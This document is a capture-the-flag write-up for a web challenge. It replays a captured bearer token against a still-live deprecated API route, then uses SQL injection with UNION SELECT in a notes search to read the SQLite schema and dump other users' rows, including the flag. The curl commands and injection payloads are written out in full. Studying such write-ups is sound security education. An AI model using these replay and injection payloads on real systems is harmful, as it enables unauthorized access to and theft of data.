# Legacy Intake

## Metadata

- Event: SECPlayground Hackloween CTF 2026 (live competition)
- Category: Mobile
- Points: 10
- Difficulty: Easy
- Status: Solved
- Re-solve: n/a
- Target: `34.21.216.220:80` (in-scope CTF host)
- Main Writeup: `README.md`; `main.ipynb`: not applicable (solved via `curl`; see inline commands)
- APK: `/downloads/spgdrop-c02.apk` (scenario build `c02`); linked from the page but not downloaded or needed
- Skills Learned: HTTP request replay, API versioning and deprecation, SQL injection, SQLite schema enumeration

## Problem Summary

> “Alice's phone kept an old intake request after a certificate failure. The current API rejects it, but the seal is in a note on the desk.”

The page showed that Alice's certificate check had failed, but the intake retry was still sent. A captured request carried an older release header and bearer credential. The current intake route rejected that credential, while the version-pinned route still accepted it and queued a note search. The notes page used exact label matching, but a SQL injection in its search parameter allowed schema enumeration and extraction of the flag.

## Prediction
<!-- user fills this in -->

## Solve Log
<!-- user fills this in -->

## Key Idea

The core vulnerability was classic SQL injection in the notes search endpoint. A single quote broke out of the label string literal, and a `UNION SELECT` returned schema and note data. The observed behavior matches a query built by raw string interpolation, such as `label = '<user input>'`, instead of a parameterized query.

The intake API also had a versioning and deprecation trap. `/api/v2/intake` rejected the captured bearer as belonging to release `2023-11`, but `/api/2023-11/intake` remained live and accepted the same request. That old route allowed the captured legacy credential to replay.

## Solution Walkthrough

### 1. Inspect the landing page

The home page identified the app as “SPGDrop — Parcel screen for stop A-101” for driver Alice. It said “Last try: Certificate did not match” and “The certificate check failed, and the release sent the intake retry anyway.” It linked to `/support/capture.txt` (“Open the support card”) and `/downloads/spgdrop-c02.apk` (Android app). The APK was not used in this solve.

```sh
curl -sS -i http://34.21.216.220/
```

### 2. Read the captured request

The support card returned this raw HTTP request as plain text:

```http
POST /api/v2/intake HTTP/1.1
Host: intake.spgdrop.example
Authorization: Bearer intake-replay-19c
X-Device: alice-phone
X-Lane-Version: 2023-11
Content-Type: application/json

{"label":"A-101","client":"legacy-cleartext"}
```

```sh
curl -sS http://34.21.216.220/support/capture.txt
```

### 3. Replay the request against the current API path

I sent the captured headers and body to the target's actual host, keeping the request path unchanged:

```sh
curl -sS -i -X POST \
  -H "Authorization: Bearer intake-replay-19c" \
  -H "X-Device: alice-phone" \
  -H "X-Lane-Version: 2023-11" \
  -H "Content-Type: application/json" \
  -d '{"label":"A-101","client":"legacy-cleartext"}' \
  http://34.21.216.220/api/v2/intake
```

The server returned `HTTP/1.1 410 GONE`:

```http
HTTP/1.1 410 GONE

{"current":"/api/v2/intake","error":"this bearer is for release 2023-11"}
```

The error named the current path and the bearer's release. That suggested looking for an endpoint pinned to the older API version.

### 4. Find and replay the version-pinned path

I probed `/api/v1/intake`, `/api/2023-11/intake`, `/api/intake/2023-11`, `/legacy/api/intake`, `/api/intake`, `/releases/2023-11/intake`, and `/api/v2023-11/intake`. All returned `404` except `/api/2023-11/intake`.

```sh
curl -sS -i -X POST \
  -H "Authorization: Bearer intake-replay-19c" \
  -H "X-Device: alice-phone" \
  -H "X-Lane-Version: 2023-11" \
  -H "Content-Type: application/json" \
  -d '{"label":"A-101","client":"legacy-cleartext"}' \
  http://34.21.216.220/api/2023-11/intake
```

That request returned `HTTP/1.1 200 OK`:

```json
{"desk":"/notes","hint":"the desk searches the label text","status":"queued"}
```

### 5. Inspect the notes search page

`GET /notes` returned an HTML search form using `GET` and parameter `q`. The page said, “Desk search for the words on a label. It should stay a search.” Its footer said, “The address on the label is 14 Elm Wharf.”

```sh
curl -sS -i http://34.21.216.220/notes
```

The form included:

```html
<form method="get" action="/notes"><input name="q" ...></form>
```

### 6. Confirm exact-match search behavior

Searching for `A-101` returned one exact match. Searching for the literal `%` and for substring `Wharf` both returned “No label matched.” The backend therefore behaved like exact string matching, not a `LIKE` or wildcard search.

```sh
curl -sS --data-urlencode 'q=A-101' -G http://34.21.216.220/notes
curl -sS --data-urlencode 'q=%' -G http://34.21.216.220/notes
curl -sS --data-urlencode 'q=Wharf' -G http://34.21.216.220/notes
```

The exact-match response was:

```html
<ul id="results"><li>A-101</li></ul>
```

The other two searches returned:

```text
No label matched.
```

### 7. Test for SQL injection

I added a quote and a true condition to the exact label. The URL-encoded request returned two rows, confirming that the input could break out of the quoted string literal:

```sh
curl -sS --data-urlencode "q=A-101' OR '1'='1" -G http://34.21.216.220/notes
```

```html
<ul id="results"><li>A-101</li><li>blue parcel</li></ul>
```

**Unresolved observation:** A simpler `q=x' OR '1'='1` dump returned only `A-101` and `blue parcel`, not the `INTAKE` row. Under a direct `OR '1'='1'` condition, I expected all rows. A `LIMIT`, a filter such as `label != ''`, or query differences could explain the result, but I did not root-cause it. The `UNION` extraction below reliably returned the flag.

### 8. Enumerate the SQLite schema with `UNION`

I queried `sqlite_master` to enumerate the schema:

```sh
curl -sS --data-urlencode "q=x' UNION SELECT sql FROM sqlite_master-- -" -G http://34.21.216.220/notes
```

The result revealed the table definition:

```html
<li>CREATE TABLE notes (label TEXT, note TEXT, owner TEXT)</li>
```

### 9. Dump the note column

I selected the `note` column from every row:

```sh
curl -sS --data-urlencode "q=x' UNION SELECT note FROM notes-- -" -G http://34.21.216.220/notes
```

The results were:

```text
Leave at the side door.
On the blue shelf.
mobile{eKgU3PIi1j}
```

### 10. Confirm the flag's row context

I concatenated each row's label, note, and owner to confirm where the flag lived:

```sh
curl -sS --data-urlencode "q=x' UNION SELECT label || ' | ' || note || ' | ' || owner FROM notes-- -" -G http://34.21.216.220/notes
```

```text
A-101 | Leave at the side door. | alice
INTAKE | mobile{eKgU3PIi1j} | dispatch
blue parcel | On the blue shelf. | alice
```

The flag belonged to the `INTAKE` row, owned by `dispatch`, not `alice`. An exact search for the plausible phone label `A-101` did not reveal that row. The `UNION` injection read data beyond the intended search result.

## Exploit / Script

No standalone script was needed. The reproducible `curl` requests above replay the captured intake request and extract the flag through the vulnerable notes search.

## Flag

`mobile{eKgU3PIi1j}`

## Lessons Learned

- Use parameterized queries or prepared statements for search input. Raw string interpolation lets a quote alter SQL syntax and lets a `UNION SELECT` extract other rows.
- Enforce access checks in the query and at the data boundary. The `INTAKE` row belonged to `dispatch`, but the search endpoint exposed it through SQL injection.
- Versioned API routes need a clear deprecation policy. The current route rejected this release's bearer, while the old release path remained reachable and accepted the captured request.
- Follow server errors as clues. The `410` response disclosed both the current path and the release expected by the bearer.
- The APK link did not mean APK analysis was required. The support capture and live HTTP endpoints were sufficient for this solve.
- Record unexplained behavior honestly. The boolean-based `OR` dump did not return every row, so the `UNION` extraction provided the reliable result.

## References

- [Challenge home page](http://34.21.216.220/)
- [Captured intake request](http://34.21.216.220/support/capture.txt)
